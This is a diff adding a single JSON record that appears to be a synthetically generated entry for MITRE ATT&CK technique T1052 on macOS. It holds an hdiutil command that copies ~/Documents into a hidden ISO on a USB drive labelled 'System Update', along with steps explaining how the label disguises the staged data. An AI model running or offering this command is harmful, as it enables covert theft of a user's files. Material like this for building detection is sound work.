@@ -1,0 +1,23 @@
+{
+  "technique_id": "T1052",
+  "platform": "macOS",
+  "shell": "Bash",
+  "command": "hdiutil makehybrid -o /Volumes/USB/.update.iso ~/Documents -udf -udf-volume-name \"System Update\"",
+  "explanation": "Creates a UDF hybrid image from local documents directly onto the USB with a benign volume label to disguise staged data.",
+  "rationale_steps": [
+    "Package files into a single image for easy removable transfer.",
+    "Use a system-like label to blend with legitimate content.",
+    "Write output straight to the external drive.",
+    "No network dependency; exfiltration relies on physical removal."
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-BASH-T1052-19e64b98-447c6eac",
+  "source_prompt_hash": "19e64b98",
+  "timestamp_utc": "2025-09-30T05:31:52.812086Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judge": null,
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
